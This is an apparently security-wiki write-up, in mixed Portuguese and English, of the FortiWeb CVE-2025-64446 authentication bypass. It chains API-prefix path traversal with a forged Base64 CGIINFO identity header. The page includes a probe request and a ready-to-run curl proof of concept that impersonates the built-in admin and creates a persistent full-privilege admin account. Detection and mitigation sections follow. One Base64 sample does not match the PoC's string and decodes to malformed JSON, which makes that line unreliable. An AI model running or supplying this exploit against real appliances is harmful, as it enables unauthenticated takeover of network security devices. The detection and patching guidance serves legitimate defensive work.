# Fortinet FortiWeb — Auth bypass via API-prefix traversal and CGIINFO impersonation

{{#include ../../banners/hacktricks-training.md}}

## Visão geral

O Fortinet FortiWeb expõe um dispatcher CGI centralizado em `/cgi-bin/fwbcgi`. Uma cadeia de duas falhas permite que um atacante remoto não autenticado:
- Reach `fwbcgi` by starting the URL with a valid API prefix and traversing directories.
- Impersonate any user (including the built-in `admin`) by supplying a special HTTP header that the CGI trusts as identity.

Aviso do fornecedor: FG‑IR‑25‑910 (CVE‑2025‑64446). Exploração foi observada in the wild para criar usuários admin persistentes.

Versões impactadas (conforme documentado publicamente):
- 8.0 < 8.0.2
- 7.6 < 7.6.5
- 7.4 < 7.4.10
- 7.2 < 7.2.12
- 7.0 < 7.0.12
- 6.4 ≤ 6.4.3
- 6.3 ≤ 6.3.23

FortiWeb 8.0.2 returns HTTP 403 for the traversal probe below.

## Sondagem rápida de vulnerabilidade

- Path traversal from API prefix to `fwbcgi`:
```http
GET /api/v2.0/cmdb/system/admin/../../../../../cgi-bin/fwbcgi HTTP/1.1
Host: <target>
```
- Interpretação: HTTP 200 → provavelmente vulnerável; HTTP 403 → corrigido.

## Cadeia da causa raiz

1) API-prefix path traversal to internal CGI
- Qualquer request path que começa com um prefixo de API FortiWeb válido (por exemplo, `/api/v2.0/cmdb/` ou `/api/v2.0/cmd/`) pode realizar path traversal com `../` até `/cgi-bin/fwbcgi`.

2) Minimal-body validation bypass
- Uma vez que `fwbcgi` é alcançado, um primeiro gate executa uma verificação JSON permissiva baseada em um arquivo por caminho em `/var/log/inputcheck/`. Se o arquivo estiver ausente, a verificação passa imediatamente. Se presente, o corpo só precisa ser JSON válido. Use `{}` como corpo mínimo compatível.

3) Header-driven user impersonation
- O programa lê a variável de ambiente CGI `HTTP_CGIINFO` (derivada do header HTTP `CGIINFO`), decodifica Base64, analisa JSON e copia atributos diretamente para o contexto de login, definindo o domain/VDOM. Chaves de interesse:
- `username`, `loginname`, `vdom`, `profname`
- Exemplo de JSON para se passar pelo admin embutido:
```json
{
"username": "admin",
"profname": "prof_admin",
"vdom": "root",
"loginname": "admin"
}
```
Base64 do acima (conforme usado no mundo real):
```
eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwcm9mbmFtZSI6ICJwcm9mX2FkbWluIiwgInZkb201OiAicm9vdCIsICJsb2dpbm5hbWUiOiAiYWRtaW4ifQ==
```
## Padrão de abuso ponta a ponta (não autenticado → admin)

1) Acesse `/cgi-bin/fwbcgi` via an API-prefix traversal.  
2) Forneça qualquer corpo JSON válido (por exemplo, `{}`) para satisfazer a verificação de entrada.  
3) Envie o header `CGIINFO: <base64(json)>` onde o JSON define a identidade alvo.  
4) Faça um POST com o JSON de backend esperado por `fwbcgi` para executar ações privilegiadas (por exemplo, criar um usuário admin para persistência).

### PoC cURL mínimo

- Probe traversal exposure:
```bash
curl -ik 'https://<host>/api/v2.0/cmdb/system/admin/../../../../../cgi-bin/fwbcgi'
```
- Personificar admin e criar um novo local admin user:
```bash
# Base64(JSON) for admin impersonation
B64='eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwcm9mbmFtZSI6ICJwcm9mX2FkbWluIiwgInZkb20iOiAicm9vdCIsICJsb2dpbm5hbWUiOiAiYWRtaW4ifQ=='

curl -ik \
-H "CGIINFO: $B64" \
-H 'Content-Type: application/json' \
-X POST \
--data '{"data":{"name":"watchTowr","access-profile":"prof_admin","access-profile_val":"0","trusthostv4":"0.0.0.0/0","trusthostv6":"::/0","type":"local-user","type_val":"0","password":"P@ssw0rd!"}}' \
'https://<host>/api/v2.0/cmdb/system/admin/../../../../../cgi-bin/fwbcgi'
```
Notas:
- Qualquer corpo JSON válido é suficiente (por exemplo, `{}`) se `/var/log/inputcheck/<path>.json` não existir.
- O esquema de ação é interno ao FortiWeb; o exemplo acima adiciona um admin local com privilégios completos.

## Detecção

- Requisições que chegam a `/cgi-bin/fwbcgi` via caminhos com prefixo API contendo `../` (por exemplo, `/api/v2.0/cmdb/.../../../../../../cgi-bin/fwbcgi`).
- Presença do header `CGIINFO` com JSON em Base64 contendo as chaves `username`/`loginname`/`vdom`/`profname`.
- Artefatos no backend:
- Arquivos por path sob `/var/log/inputcheck/` (configuração do gate).
- Criação inesperada de admin e alterações de configuração.
- Validação rápida: a traversal probe retornando 200 (exposto) vs 403 (bloqueado em builds corrigidos).

## Mitigação

- Atualize para versões corrigidas (ex.: 8.0.2, 7.6.5, 7.4.10, 7.2.12, 7.0.12) conforme o advisory do fornecedor.
- Até aplicar o patch:
- Não exponha o plano de gerenciamento do FortiWeb a redes não confiáveis.
- Adicione regras no reverse-proxy/WAF para bloquear:
- Caminhos que começam com `/api/` e contêm `../cgi-bin/fwbcgi`.
- Requisições com um header `CGIINFO`.
- Monitore e alerte com base nos indicadores de detecção acima.

## Referências

- [When the impersonation function gets used to impersonate users — Fortinet FortiWeb auth bypass (watchTowr Labs)](https://labs.watchtowr.com/when-the-impersonation-function-gets-used-to-impersonate-users-fortinet-fortiweb-auth-bypass/)
- [watchTowr vs FortiWeb Auth Bypass — Detection artefact generator](https://github.com/watchtowrlabs/watchTowr-vs-Fortiweb-AuthBypass)

{{#include ../../banners/hacktricks-training.md}}
